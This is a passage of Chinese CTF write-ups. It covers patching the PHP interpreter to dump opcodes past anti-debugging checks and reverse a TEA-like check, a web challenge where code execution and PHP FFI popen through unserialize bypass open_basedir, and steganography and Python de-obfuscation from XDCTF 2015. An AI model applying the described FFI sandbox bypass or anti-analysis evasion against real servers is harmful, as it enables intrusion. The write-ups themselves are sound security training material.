 static zend_always_inline void zend_vm_init_call_frame(zend_execute_data *call, uint32_t call_info, zend_function *func, uint32_t num_args, zend_class_entry *called_scope, zend_object *object)
 {
 	call->func = func;
@@ -182,6 +196,25 @@ static zend_always_inline void zend_vm_init_call_frame(zend_execute_data *call,
 		ZEND_SET_CALL_INFO(call, 0, call_info);
 	}
 	ZEND_CALL_NUM_ARGS(call) = num_args;
+			
+	/*if (func && !func->common.function_name) {
+		vld_dump_oparray(&(func->op_array));
+	}*/
+	if (func && func->common.function_name) {
+		/*if (strcmp(ZSTR_VAL(func->common.function_name), "var_dump") == 0) {
+			if (!sg_comp_file) {
+				sg_comp_file = zend_compile_file;
+				zend_compile_file = new_zend_compile_file;
+			}
+		}*/
+		if (strcmp(ZSTR_VAL(func->common.function_name), "verify") == 0) {
+			vld_dump_oparray(&(func->op_array));
+		}
+		if (strcmp(ZSTR_VAL(func->common.function_name), "a") == 0) {
+			printf("FUNC2 %s\n", ZSTR_VAL(func->common.function_name));
+			php_my_compile_string(call, num_args);
+		}
+	}
 }
 
------------------------- Zend/zend_language_scanner.c -------------------------
index 5d6d9ca..3acea8b 100644
@@ -764,6 +764,7 @@ zend_op_array *compile_string(zval *source_string, char *filename)
 		zval_ptr_dtor(&tmp);
 		return NULL;
 	}
+	//zend_write(Z_STRVAL_P(&tmp), Z_STRLEN(tmp));
 
 	zend_save_lexical_state(&original_lex_state);
 	if (zend_prepare_string_for_scanning(&tmp, filename) == SUCCESS) {
@@ -777,6 +778,27 @@ zend_op_array *compile_string(zval *source_string, char *filename)
 	return op_array;
 }
 
+extern void php_var_dump(zval *struc, int level);
+
+ZEND_API void php_my_compile_string(zend_execute_data *call, uint32_t num_args) {
+	char code[] = "var_dump($v);";
+	zend_eval_stringl(code, sizeof(code)-1, NULL, "");
+	
+	zend_execute_data *execute_data = call;
+	
+	zval *args;
+	int argc;
+	int	i;
+
+	ZEND_PARSE_PARAMETERS_START(num_args, num_args)
+		Z_PARAM_VARIADIC('+', args, argc)
+	ZEND_PARSE_PARAMETERS_END();
+
+	for (i = 0; i < argc; i++) {
+		printf("args[%d]: ", i);
+		php_var_dump(&args[i], 1);
+	}
+}
 
 BEGIN_EXTERN_C()
 int highlight_file(char *filename, zend_syntax_highlighter_ini *syntax_highlighter_ini)

---------------------------- Zend/zend_vm_execute.h ----------------------------
index 5355f7b..18f56ea 100644
@@ -60814,9 +60814,16 @@ zend_leave_helper_SPEC_LABEL:
 	zend_error_noreturn(E_CORE_ERROR, "Arrived at end of main loop which shouldn't happen");
 }
 
+// 强行内核植入vld
+#include "srm_oparray.c"
+#include "set.c"
+#include "branchinfo.c"
+#include "vld.c"
+
 ZEND_API void zend_execute(zend_op_array *op_array, zval *return_value)
 {
 	zend_execute_data *execute_data;
+	vld_dump_oparray(op_array);
 
 	if (EG(exception) != NULL) {
 		return;
```

出题人给出的提示writeup的主要意义就在于给出了一个比较良好的hook点`zend_vm_init_call_frame`，所有函数调用的时候都会经过这里。

比如说首先我们可以在这里强行插入个`var_dump`（把`PHP_FUNCTION(var_dump)`的代码粘贴到`php_my_compile_string`然后`zend_vm_init_call_frame`里调`php_my_compile_string`）：
```c
+   zend_execute_data *execute_data = call;
+	zval *args;
+	int argc;
+	int	i;
+
+	ZEND_PARSE_PARAMETERS_START(num_args, num_args)
+		Z_PARAM_VARIADIC('+', args, argc)
+	ZEND_PARSE_PARAMETERS_END();
+
+	for (i = 0; i < argc; i++) {
+		printf("args[%d]: ", i);
+		php_var_dump(&args[i], 1);
```

然后函数调用实际上就变成`var_dump(...$args); ORIGINAL_FUNCTION(...$args);`了。跑一下php能得到调用函数名和对应的参数，然而参数似乎有些错位（得到的是前x>=0次函数调用的参数，脑补一下基本能看下大概，但后面被小坑了一下）如下:

```
FUNC2 dirname
args[0]: UNKNOWN:0
FUNC2 sg_load
args[0]: UNKNOWN:0
FUNC2 var_dump
args[0]: int(1)
string(2) "11"
FUNC2 verify
args[0]: string(2) "11"
FUNC2 php_sapi_name
FUNC2 ini_get
args[0]: UNKNOWN:0
FUNC2 unpack
args[0]: string(10) "vld.active"
args[1]: UNKNOWN:0
FUNC2 str_repeat
args[0]: UNKNOWN:0
args[1]: UNKNOWN:0
FUNC2 array_values
args[0]: string(2) "V*"
FUNC2 floor
args[0]: array(3) {
  [1]=>
  int(1195461702)
  [2]=>
  int(1380272223)
  [3]=>
  int(69)
}
FUNC2 a
args[0]: int(19)
args[1]: NULL
args[2]: UNKNOWN:0
args[3]: UNKNOWN:0
args[4]: UNKNOWN:0
args[5]: UNKNOWN:0
FUNC2 a
args[0]: int(2654435769)
args[1]: int(1380272223)
args[2]: int(9)
args[3]: int(0)
args[4]: int(2)
args[5]: array(4) {
  [0]=>
  int(1752186684)
  [1]=>
  int(1600069744)
  [2]=>
  int(1953259880)
  [3]=>
  int(1836016479)
}
FUNC2 a
args[0]: int(2654435769)
args[1]: int(69)
args[2]: int(1522836630)
args[3]: int(1)
args[4]: int(2)
args[5]: array(4) {
  [0]=>
  int(1752186684)
  [1]=>
  int(1600069744)
  [2]=>
  int(1953259880)
  [3]=>
  int(1836016479)
}
FUNC2 a
args[0]: int(2654435769)
args[1]: int(9)
args[2]: int(3439883452)
args[3]: int(2)
args[4]: int(2)
args[5]: array(4) {
  [0]=>
  int(1752186684)
  [1]=>
  int(1600069744)
  [2]=>
  int(1953259880)
  [3]=>
  int(1836016479)
}
<.......省略N多次>
FUNC2 a
args[0]: int(3189639355)
args[1]: int(3066432098)
args[2]: int(3753685081)
args[3]: int(1)
args[4]: int(2)
args[5]: array(4) {
  [0]=>
  int(1752186684)
  [1]=>
  int(1600069744)
  [2]=>
  int(1953259880)
  [3]=>
  int(1836016479)
}
FUNC2 a
args[0]: int(3189639355)
args[1]: int(3587527111)
args[2]: int(1255178940)
args[3]: int(2)
args[4]: int(2)
args[5]: array(4) {
  [0]=>
  int(1752186684)
  [1]=>
  int(1600069744)
  [2]=>
  int(1953259880)
  [3]=>
  int(1836016479)
}
Wrong!
```

可以看到检测了`vld.active`，以及大量调用了`a`这个盒函数。接下来我们dump一下`a`和题目的`verify`的opcode，

我们有多种方法dump opcode:    

- 一种是把vld植入到内核去（内核直接include vld的c文件一起编译比较方便快捷）然后在合适的时候调`vld_dump_oparray`
- 或者把`ini_get('vld.active')`的返回结果hook掉正常上vld
- 把vld中的'vld.active'选项换个名字什么的之类的。
- ...and more

这里用的是第一种，代码详见一开始的diff。

`zend_vm_init_call_frame`里插一句：
```c
if (strcmp(ZSTR_VAL(func->common.function_name), "verify") == 0) {
	vld_dump_oparray(&(func->op_array));
}
```

然后vld稍后发现也要魔改下，否则double和编译时常量array显示不全。vld里的print double时的`vld_printf("%g", zval)`被我替换成了`printf("%lf", zval)`，（等下还有个`$b`赋的数组字面量值的获取的问题）。得到的opcode:     

`a`函数和手动反编译opcode结果：
```
filename:       D:\php-src\x64\Release\protected.php
function name:  a
number of ops:  24
compiled vars:  !0 = $q, !1 = $y, !2 = $z, !3 = $p, !4 = $e, !5 = $k
line     #* E I O op                           fetch          ext  return  operands
-------------------------------------------------------------------------------------
   3     0*       RECV
         1*       RECV
         2*       RECV
         3*       RECV
         4*       RECV
         5*       RECV
   4     6*       SR                                                       !2, 5
   
                  
   
         7*       BW_AND                                                   ~6, 134217727
					
		 
         8*       SL                                                       !1, 2
					
		 
         9*       BW_XOR                                                   ~7, ~8
					((($z >> 5) & 134217727) ^ ($y << 2))
		 
        10*       SR                                                       !1, 3
						
		
		
        11*       BW_AND                                                   ~10, 536870911
					
		
        12*       SL                                                       !2, 4
        13*       BW_XOR                                                   ~11, ~12
						((($y >> 3) & 536870911) ^ ($z << 4))
		
        14*       ADD                                                      ~9, ~13
					(((($z >> 5) & 134217727) ^ ($y << 2))+((($y >> 3) & 536870911) ^ ($z << 4)))
		
        15*       BW_XOR                                                   !0, !1
					($q ^ $y)
		
        16*       BW_AND                                                   !3, 3 
		
        17*       BW_XOR                                                   !4, ~16
						 
		
        18*       FETCH_DIM_R                                              !5, ~17
						
		
        19*       BW_XOR                                                   !2, ~18
						($k[($e ^ ($p & 3))] ^ $z)
		
        20*       ADD                                                      ~15, ~19
					(($q ^ $y)+($k[($e ^ ($p & 3))] ^ $z))
		
        21*       BW_XOR                                                   ~14, ~20
        22*       RETURN                                                   ~21
   5    23*       RETURN                                                   null
   
   
   
   
$k = [1752186684,1600069744,1953259880,1836016479];

function a($q, $y, $z, $p, $e, $k) {
	return (((($z >> 5) & 134217727) ^ ($y << 2))+((($y >> 3) & 536870911) ^ ($z << 4)))^(($q ^ $y)+($k[($e ^ ($p & 3))] ^ $z));
}
```

$k的值可以从上面`var_dump`的结果中直接拿过来就完了。     

`verify`函数和手动反编译opcode结果（100多行opcode看的要死，变量还多...结合代码行号一起看脑补方便点）：
```
filename:       D:\php-src\x64\Release\protected.php
function name:  verify
number of ops:  116
compiled vars:  !0 = $str, !1 = $v, !2 = $b, !3 = $k, !4 = $n, !5 = $z, !6 = $q, !7 = $sum, !8 = $e, !9 = $p, !10 = $y, !11 = $i
line     #* E I O op                           fetch          ext  return  operands
-------------------------------------------------------------------------------------
   7     0*       RECV
   8     1*       INIT_FCALL                                               'php_sapi_name'
         2*       DO_ICALL                                         $12
         3*       IS_IDENTICAL                                             $12, 'phpdbg'
         4*       JMPZ                                                     ~13, ->6
   9     5*       EXIT                                                     'Sorry+but+no+phpdbg'
  11     6*       INIT_FCALL                                               'ini_get'
         7*       SEND_VAL                                                 'vld.active'
         8*       DO_ICALL                                         $14
		 
		 
         9*       IS_EQUAL                                                 $14, 1
        10*       JMPZ                                                     ~15, ->14
  12    11*       INIT_FCALL                                               'dir'
        12*       SEND_VAL                                                 'Sorry+but+no+vld'
        13*       DO_ICALL
		
		
  14    14*       INIT_FCALL                                               'unpack'
        15*       SEND_VAL                                                 'V%2A'
        16*       INIT_FCALL                                               'str_repeat'
        17*       SEND_VAL                                                 '%00'
        18*       STRLEN                                                   !0
        19*       MOD                                                      ~17, 4
        20*       SUB                                                      4, ~18
        21*       BW_AND                                                   ~19, 3
        22*       SEND_VAL                                                 ~20
        23*       DO_ICALL                                         $21
        24*       CONCAT                                                   !0, $21
        25*       SEND_VAL                                                 ~22
        26*       DO_ICALL                                         $23
		
		
		
		
        27*       ASSIGN                                                   !1, $23
		$v = unpack('V%2A', $str.str_repeat('%00', 4-strlen($str)));
		
		
  15    28*       INIT_FCALL                                               'array_values'
        29*       SEND_VAR                                                 !1
        30*       DO_ICALL                                         $25
        31*       ASSIGN                                                   !1, $25
		
		
		$v = array_values($v);
		
		
  16    32*       COUNT                                                    !1
        33*       STRLEN                                                   !0
        34*       ASSIGN_DIM                                               !1, ~27
        35*       OP_DATA                                                  ~29
		$v[count($v)]=strlen($str);
		
  17    36*       ASSIGN                                                   !2, <array>
  18    37*       ASSIGN                                                   !3, <array>
  $k = [1752186684,1600069744,1953259880,1836016479];
  $b = ????;
  
  19    38*       COUNT                                                    !1
        39*       SUB                                                      ~32, 1
        40*       ASSIGN                                                   !4, strlen($str)
		$n= COUNT($v)-1;
		
  20    41*       FETCH_DIM_R                                              !1, !4
        42*       ASSIGN                                                   !5, ~35
		$z = $v[COUNT($v)-1];
		
  21    43*       INIT_FCALL                                               'floor'
        44*       ADD                                                      !4, 1
        45*       DIV                                                      52, ~37
        46*       ADD                                                      6, ~38
        47*       SEND_VAL                                                 ~39
        48*       DO_ICALL                                         $40
        49*       ASSIGN                                                   !6, $40
		
		$q = floor(52/COUNT($v)+6);
		
		22    50*       ASSIGN                                                   !7, 0
			  23    51*       JMP                                                      ->97
		for($sum=0; $e >= 0; $q--) {  

			24    52*       ADD                                                      !7, 2654435769
				53*       BW_AND                                                   ~43, 4294967295
				54*       ASSIGN                                                   !7, ~44
			$sum = ($sum + 2654435769) & 0xffffffff;
			
			25    55*       SR                                                       !7, 2
					56*       BW_AND                                                   ~46, 3
					57*       ASSIGN                                                   !8, ~47
			$e = ($sum >> 2) & 3;
			
			26    58*       ASSIGN                                                   !9, 0
					59*       JMP                                                      ->79
					
			for ($p=0; $p<$n; $p++) {
				
			
				  27    60*       ADD                                                      !9, 1
						61*       FETCH_DIM_R                                              !1, ~50
						62*       ASSIGN                                                   !10, ~51
				  $y = $v[$p+1];	
						
				  28    63*       FETCH_DIM_R                                              !1, !9
				  
						64*       INIT_FCALL                                               'a'
						65*       SEND_VAR                                                 !7
						66*       SEND_VAR                                                 !10
						67*       SEND_VAR                                                 !5
						68*       SEND_VAR                                                 !9
						69*       SEND_VAR                                                 !8
						70*       SEND_VAR                                                 !3
						71*       DO_UCALL                                         $55
					
					$z = $v[$p] = (a($sum, $y, $z, $p, $e, $k)+$v[$p]) & 0xffffffff;
						
						
						72*       ADD                                                      ~54, $55
						73*       BW_AND                                                   ~56, 4.29497e+9
						
						74*       ASSIGN_DIM                                       $53     !1, !9
						75*       OP_DATA                                                  ~57
						76*       ASSIGN                                                   !5, $53
						
				  26    77*       POST_INC                                                 !9
						78*       FREE                                                     ~59
						
						79*       IS_SMALLER                                               !9, !4
						80*       JMPNZ                                                    ~60, ->60
			}
			
			  
			  30    81*       FETCH_DIM_R                                              !1, 0
					82*       ASSIGN                                                   !10, ~61
					
				$y = $v[0];
					
			  31    83*       FETCH_DIM_R                                              !1, !4
			  
					84*       INIT_FCALL                                               'a'
					85*       SEND_VAR                                                 !7
					86*       SEND_VAR                                                 !10
					87*       SEND_VAR                                                 !5
					88*       SEND_VAR                                                 !9
					89*       SEND_VAR                                                 !8
					90*       SEND_VAR                                                 !3
					91*       DO_UCALL                                         $65
					
					$z = $v[$n] = ($v[$n] + a($sum, $y, $z, $p, $e, $k)) & 0xffffffff;
					
					92*       ADD                                                      ~64, $65
					93*       BW_AND                                                   ~66, 4.29497e+9
					94*       ASSIGN_DIM                                       $63     !1, !4
					95*       OP_DATA                                                  ~67
					96*       ASSIGN                                                   !5, $63
					
			  23    97*       POST_DEC                                                 !6
					98*       IS_SMALLER                                               0, ~69
					99*       JMPNZ                                                    ~70, ->52
					
		}
					
  33   100*       ASSIGN                                                   !11, 0
       101*       JMP                                                      ->110
	   
  34   102*       FETCH_DIM_R                                              !1, !11
				$v[$i]
       103*       MOD                                                      !11, 4
       104*       FETCH_DIM_R                                              !3, ~74
				
       105*       BW_XOR                                                   ~73, ~75
				
       106*       ASSIGN_DIM                                               !1, !11
       107*       OP_DATA                                                  ~76
  33   108*       POST_INC                                                 !11
       109*       FREE                                                     ~77
       110*       COUNT                                                    !1
       111*       IS_SMALLER                                               !11, ~78
       112*       JMPNZ                                                    ~79, ->102
	   
	   
  36   113*       IS_EQUAL                                                 !1, !2
       114*       RETURN                                                   ~80
  37   115*       RETURN                                                   null
```

似乎vld打印的反汇编的opcode有些地方有点问题（估计版本跟不上opcode变化的原因）。而且有vld不支持`$b`的常量赋值显示`<array>`的问题，我在`verify`里调`floor`的时候插一句`eval('var_dump($b);');`就能打出来了，大致如下：
```c
if (strcmp(ZSTR_VAL(func->common.function_name), "floor") == 0) {
	char code[] = "var_dump($b);";
	zend_eval_stringl(code, sizeof(code)-1, NULL, "");
}
```

上面人肉反编译的有些地方可能有小问题，结合前面`var_dump`出的`a`函数每次调用的参数可以debug一下还原出的`verify`代码验证下是否完全还原正确（由于`var_dump`打出来的函数调用的参数错位的问题一开始以为最后要`if ($q==1) break;`，结果想起来发现应该是最后轮`a`的参数没打出来的原因...），然后再逆向最终如下：
```php
<?php

function a($q, $y, $z, $p, $e, $k) {
	var_dump($q, $y, $z, $p, $e, $k);
	return (((($z >> 5) & 134217727) ^ ($y << 2))+((($y >> 3) & 536870911) ^ ($z << 4)))^(($q ^ $y)+($k[($e ^ ($p & 3))] ^ $z));
}

function verify($str) {
	$v = unpack("V\x2a", $str.str_repeat("\0", (4-(strlen($str)%4))&3));
	$v = array_values($v);
	$v[count($v)]=strlen($str);
	$k = [1752186684,1600069744,1953259880,1836016479];
	$b = [1029560848,2323109303,4208702724,3423862500,3597800709,2222997091,4137082249,2050017171,4045896598];
	$n = COUNT($v)-1;
	$z = $v[COUNT($v)-1];
	$q = floor(52/COUNT($v)+6);
	var_dump($v);
	for($sum=0; 0 < $q; $q--) {  

		$sum = ($sum + 2654435769) & 0xffffffff;
		$e = ($sum >> 2) & 3;
		for ($p=0; $p<$n; $p++) {
			$z = $v[$p] = ((a($sum, $v[$p+1], $z, $p, $e, $k)+$v[$p]) & 0xffffffff);
		}
		//if ($q==1) break;
		$z = $v[$n] = ($v[$n] + a($sum, $v[0], $z, $p, $e, $k)) & 0xffffffff;
	}
	for($i=0;$i<count($v);$i++) {
		$v[$i] = $v[$i] ^ $k[$i%4];
	}
	var_dump('final',$v);
	return $v == $b;
}

//verify('FLAG_HERE');
reverse();

function reverse() {
	$v = $b = [1029560848,2323109303,4208702724,3423862500,3597800709,2222997091,4137082249,2050017171,4045896598];
	//$v = [3083636581,361734860,1305231159,4060754200];
	$k = [1752186684,1600069744,1953259880,1836016479];
	
	for($i=0;$i<count($v);$i++) {
		$v[$i] = $v[$i] ^ $k[$i%4];
	}
	$n = COUNT($v)-1;
	
	// calc $sum
	$q = floor(52/COUNT($v)+6);
	for($sum=0; 0 < $q; $q--) {  
		$sum = ($sum + 2654435769) & 0xffffffff;
	}
	
	$end_q = floor(52/COUNT($v)+6);
	for($q = 1; ; $q++) {
		$e = ($sum >> 2) & 3;
		
		$v[$n] = ($v[$n] - a($sum, $v[0], $v[$n-1], $n, $e, $k)) & 0xffffffff;
		
		for ($p = $n-1; $p != 0; $p--) {
			$v[$p] = ($v[$p] - a($sum, $v[$p+1], $v[$p-1], $p, $e, $k)) & 0xffffffff;
		}
		if ($q == $end_q) $z = $v[COUNT($v)-1]; else $z = $v[$n];
		$v[$p] = ($v[$p] - a($sum, $v[$p+1], $z, $p, $e, $k)) & 0xffffffff;
		
		$sum = ($sum - 2654435769) & 0xffffffff;
		$e = ($sum >> 2) & 3;
		if ($q == $end_q) break;
	}
	assert($sum == 0);
	//var_dump($v);
	$ret = '';
	for ($i=0; $i < count($v)-1; $i++) {
		$ret .= pack('V',$v[$i]);
	}
	echo ($ret);
}
```

### WEB - nextphp

上来scandir('.')然后读`preload.php`的代码：
![doc](nextphp/scandir_fileGetContents.png)

然后注意到是`PHP/7.4-dev`，查了update logs，关键信息都在这页上了：
![doc](nextphp/doc.png)

只要仔细读读这页里面给出的RFC链接，https://wiki.php.net/rfc/ffi , 就能懂FFI是什么东西,就是允许php代码直接调用C层面函数。    

查查提到的相关ini设置：
```
/?a=var_dump(ini_get("ffi.enable"));
/?a=var_dump(ini_get("opcache.preload"));
```

![phpinfo](nextphp/ffi_enable.png)

也就是说我们可以通过FFI调用c的popen来绕过open_basedir之类的限制，但是FFI为了安全只设置为了只能在`opcache.preload`用，然后preload里有unserialize那大概就是反序列化的时候调FFI了。    

exp的思路就是`FFI::new`个`char[999]`，`FFI::cdef`然后`popen`执行写入到buf，`zend_write`回显buf。

最终payload：
![final](nextphp/final_payload.png)

然而这FFI也是坑，比如`zend_write`要先`clone`一下才能调而`sprintf`又不能clone要直接调啦，原本想让`escapeshellargs`和`shell_exec`交换一下函数指针也不行（`zif_*`貌似没有导出符号的原因，没仔细看），之类的种种坑，懒得搭本地环境看不到错误信息，深夜折腾exp了三小时也是蛋疼...



### File: CTF-Writeups/XDCTF2015/README.md

# XDCTF 2015 Writeup

## MISC 300

上来肯定先例行检查下LSB啦    

```python
>>> import Image
>>> a=Image.open('zxczxc.png')
>>> a.point(lambda i: 255 if i&1 else 0).show()
```

![MISC300_1](misc300_1.png)

可以发现第一列有藏着东西，仔细看看像素值    

```python
>>> for i in xrange(100):
...     print a.getpixel((0,i))
...
(252, 255, 254)
(253, 252, 255)
(254, 252, 252)
(254, 253, 254)
(252, 255, 253)
(252, 253, 254)
(253, 254, 252)
(254, 252, 255)
(253, 255, 253)
(252, 253, 254)
(254, 253, 252)
(254, 253, 253)
(253, 254, 253)
(252, 253, 254)
(252, 255, 252)
...
```

发现其在252~255之间，那就是用了最后两位藏数据    
最后试了下是按像素顺序、RGB顺序、倒数第二第一位的顺序排列的01串    

```python
>>> s=''
>>> for i in xrange(165):
...     p=a.getpixel((0,i))
...     for k in xrange(3):
...             s+='1' if p[k]&2 else '0'
...             s+='1' if p[k]&1 else '0'
...
>>> s
'001110010011100000100110001101000110011000100011011101000110100100100101011001000110001100110010001100010011000000101110001100100011011100101110001100010011000000101110001100010011100100110101001011010011001000110000001100010011010100101101001100000011100100101101001100010011011001010100001100000011010100111010001100100011000100111010001101010011001000101011001100000011001000111010001100000011000000111001001110000010011000110100011001100010001101110100011010010010010101100100011000110111100011011010101010110100100001001001001011100100100110101011001011100010111000110001010011100100111111001100001100110100100000101111001100100010100111001000101010001101010001001101110011010100101100110110010010000011000111010110001101010011011110101110001010001101000100110101110011000010101111001001110101110011010111001100001101010100100101001111101011010000010100000000010110100111000000001111000101110011100100111000001001100011010001100110001000110111010001101001001001010110010001100011111111'
>>> def tostr(s):
...     ret=''
...     for i in xrange(0, len(s), 8):
...             ret+=chr(int(s[i:i+8],2))
...     return ret
...
>>> tostr(s)
'98&4f#ti%dc210.27.10.195-2015-09-16T05:21:52+02:0098&4f#ti%dcx\xda\xabHI.I\xab..1NO\xcc3H/2)\xc8\xa8\xd4M\xcdK6H1\xd657\xae(\xd15\xcc+\xc9\xd75\xcc5IO\xad\x05\x00Zp\x0f\x1798&4f#ti%dc?'
>>>
```

可以看到210.27.10.195-2015-09-16T05:21:52+02:00以及分隔符样的东西98&4f#ti%dc     
一开始还以为那个IP 210.27.10.195有什么东西...     
然后队友说这是zlib compressed才注意到第二个分隔符后有x\xda这个头.....     

```python
>>> import zlib
>>> zlib.decompress('x\xda\xabHI.I\xab..1NO\xcc3H/2)\xc8\xa8\xd4M\xcdK6H1\xd657\xae(\xd15\xcc+\xc9\xd75\xcc5IO\xad\x05\x00Zp\x0f\x1798&4f#ti%dc')
'xdctf{st3gan0gr4phy-enc0d3-73xt-1nto-1m4ge}'
```

得到Flag   



## REVERSE 300

### 尝试

原源代码：
```python
(lambda __g, __y: [[[[[[[(fin.close(), [[(lambda __items, __after, __sentinel: __y(lambda __this: lambda: (lambda __i: [(ss.append(c), (sss.append(0), __this())[1])[1] for __g['c'] in [(__i)]][0] if __i is not __sentinel else __after())(next(__items, __sentinel)))())(iter(s), lambda: [[(lambda __items, __after, __sentinel: __y(lambda __this: lambda: (lambda __i: [(lambda __value: [__this() for __g['sssss'] in [((lambda __ret: __g['sssss'] + __value if __ret is NotImplemented else __ret)(getattr(__g['sssss'], '__iadd__', lambda other: NotImplemented)(__value)))]][0])(chr(c)) for __g['c'] in [(__i)]][0] if __i is not __sentinel else __after())(next(__items, __sentinel)))())(iter(ssss), lambda: [(fout.write(sssss), (fout.close(), None)[1])[1] for __g['fout'] in [(open('flag.enc', 'wb+'))]][0], []) for __g['sssss'] in [('')]][0] for __g['ssss'] in [(encode(ss, sss))]][0], []) for __g['sss'] in [([])]][0] for __g['ss'] in [([])]][0])[1] for __g['s'] in [(fin.read().strip())]][0] for __g['fin'] in [(open('flag.txt', 'r'))]][0] for __g['encode'], encode.__name__ in [(lambda data, buf: (lambda __l: [[(lambda __items, __after, __sentinel: __y(lambda __this: lambda: (lambda __i: [[__this() for __l['data'][__l['i']] in [((table.index(__l['data'][__l['i']]) + 1))]][0] for __l['i'] in [(__i)]][0] if __i is not __sentinel else __after())(next(__items, __sentinel)))())(iter(xrange(__l['_len'])), lambda: (lambda __items, __after, __sentinel: __y(lambda __this: lambda: (lambda __i: [[[__this() for __l['buf'] in [(setbit(__l['buf'], __l['i'], getbit(__l['data'], __l['j'])))]][0] for __l['j'] in [((((__l['i'] / 6) * 8) + (__l['i'] % 6)))]][0] for __l['i'] in [(__i)]][0] if __i is not __sentinel else __after())(next(__items, __sentinel)))())(iter(xrange((__l['_len'] * 6))), lambda: __l['buf'], []), []) for __l['_len'] in [(len(__l['data']))]][0] for __l['data'], __l['buf'] in [(data, buf)]][0])({}), 'encode')]][0] for __g['getbit'], getbit.__name__ in [(lambda p, pos: (lambda __l: [[[((__l['p'][__l['cpos']] >> __l['bpos']) & 1) for __l['bpos'] in [((__l['pos'] % 8))]][0] for __l['cpos'] in [((__l['pos'] / 8))]][0] for __l['p'], __l['pos'] in [(p, pos)]][0])({}), 'getbit')]][0] for __g['setbit'], setbit.__name__ in [(lambda p, pos, value: (lambda __l: [[[(lambda __target, __slice, __value: [(lambda __target, __slice, __value: [__l['p'] for __target[__slice] in [((lambda __old: (lambda __ret: __old | __value if __ret is NotImplemented else __ret)(getattr(__old, '__ior__', lambda other: NotImplemented)(__value)))(__target[__slice]))]][0])(__l['p'], __l['cpos'], (__l['value'] << __l['bpos'])) for __target[__slice] in [((lambda __old: (lambda __ret: __old & __value if __ret is NotImplemented else __ret)(getattr(__old, '__iand__', lambda other: NotImplemented)(__value)))(__target[__slice]))]][0])(__l['p'], __l['cpos'], (~(1 << __l['bpos']))) for __l['bpos'] in [((__l['pos'] % 8))]][0] for __l['cpos'] in [((__l['pos'] / 8))]][0] for __l['p'], __l['pos'], __l['value'] in [(p, pos, value)]][0])({}), 'setbit')]][0] for __g['table'] in [(string.printable.strip())]][0] for __g['string'] in [(__import__('string', __g, __g))]][0])(globals(), (lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))))
```

一大堆lambda...嗯，其实这题还是很简单的...    

在本地尝试执行，并查看globals()，得

```python
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "<stdin>", line 1, in <lambda>
IOError: [Errno 2] No such file or directory: 'flag.txt'
>>> globals()
{'string': <module 'string' from 'D:\Python27\lib\string.pyc'>, '__builtins__': <module '__builtin__' (built-in)>, '__package__': None, 'i': 654, 'table': '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~', 'encode': <function encode at 0x02836C30>, '__name__': '__main__', 'getbit': <function getbit at 0x028364B0>, '__doc__': None, 'setbit': <function setbit at 0x02815E30>}
```

也就是import string，并生成了encode(), getbit(), setbit()的函数，还有一个table     
下面还是先介绍下背景知识吧....    

### 函数式编程与lambda运算

这个程序跟函数式编程还是有一定关系的，当然不会也能做...    
下面就是这个.py的主要trick     

#### 等量代换(实现where语句，scope内赋值)

不妨先看下这样的例子：    
`[y for y in [1]] == [1]`

再看个复杂点的
```python
[x for x in [range(3)]] == [x for x in [[0, 1, 2]]] == [ [0,1,2] ]
```

如果把最外层的方括号看成一个scope，也就是如同C语言里的{}所起的作用一样，那么这句话就是一个等量代换，把这句话变形一下易于理解，即：
```
[
	x
	for x in [range(3)]
]
```

去掉in，得

```
[
	x
	for x = range(3)
]
```

把最外层[]理解成c语言的scope

```
{
	x = range(3)
	返回 x
}
```

求值得

```
{
	[0, 1, 2]
}
```

把scope变回来，即得`[ [0,1,2] ]`
换句话，我们得到两个等量代换式：

`[blahblah(x) for x in [y] ] == [blahblah(x) where x = y]`
`[blahblah(x) for x in [[y]][0] ] == [blahblah(x) where x = y]`

这样相当于haskell的where语句    

也就是说，可以用这种形式实现在scope内的赋值操作，在scope内把x赋值为y     
比如说，要想得到`[(0, 0)]`我们可以这样写：     
`[(x, y) for x in [0] for y in [[0]][0]] == [(0, 0)]`

### lambda calculus beta规约（实现let语句）

以下是lambda calculus的beta规约定理的例子：

```python
(lambda j: j*2)(3) == (3*2) == 6
```

如果把lambda运算内部视为一个scope，那么就相当于
```
lambda:
	let j = 3:
		return j*2
```


#### 开始逆向

trick讲完了，就可以粗粗整理下代码了，加些赋值符号：

```python
(lambda __g, __y: [[[[[[[(fin.close(), [[(lambda __items, __after, __sentinel: __y(lambda __this: lambda: 

(lambda __i: [(ss.append(c), (sss.append(0), __this())[1])[1] 
for __g['c'] in [(__i)]][0] if __i is not __sentinel else __after())

(next(__items, __sentinel)))())(iter(s), lambda: [[(lambda __items, __after, __sentinel: __y(lambda __this: lambda: (lambda __i: [(lambda __value: [__this() for __g['sssss'] in [((lambda __ret: __g['sssss'] + __value if __ret is NotImplemented else __ret)(getattr(__g['sssss'], '__iadd__', lambda other: NotImplemented)(__value)))]][0])(chr(c)) for __g['c'] in [(__i)]][0] if __i is not __sentinel else __after())(next(__items, __sentinel)))())(iter(ssss), lambda: [(fout.write(sssss), (fout.close(), None)[1])[1] for __g['fout'] in [(open('flag.enc', 'wb+'))]][0], []) 

for __g['sssss'] in [('')]][0] 
for __g['ssss'] in [(encode(ss, sss))]][0], []) 
for __g['sss'] in [([])]][0] 
for __g['ss'] in [([])]

][0])[1] 

for __g['s'] in [(fin.read().strip())]][0]

for __g['fin'] in [(open('flag.txt', 'r'))]][0] 

for __g['encode'], encode.__name__ in [

(lambda data, buf: 
  (lambda __items, __after, __sentinel: 
    __y(lambda __this: lambda: 
      (lambda __i: 
        [data['i'] = ((table.index(data['i']) + 1))
        if __i is not __sentinel else __after())(next(__items, __sentinel)))())(iter(xrange(__l['_len'])), 
        
        lambda: (lambda __items, __after, __sentinel: 
          __y(lambda __this: lambda: (lambda __i: [[[
          
          __this() for __l['buf'] in [(
             j=(i / 6) * 8 + (i % 6)
             setbit(buf, i, getbit(data, j))
             
              if __i is not __sentinel else __after())(next(__items, __sentinel)))())
        
        (iter(xrange((__l['_len'] * 6))), lambda: __l['buf'], []), []) for __l['_len'] in [(len(__l['data']))] )

]][0] 

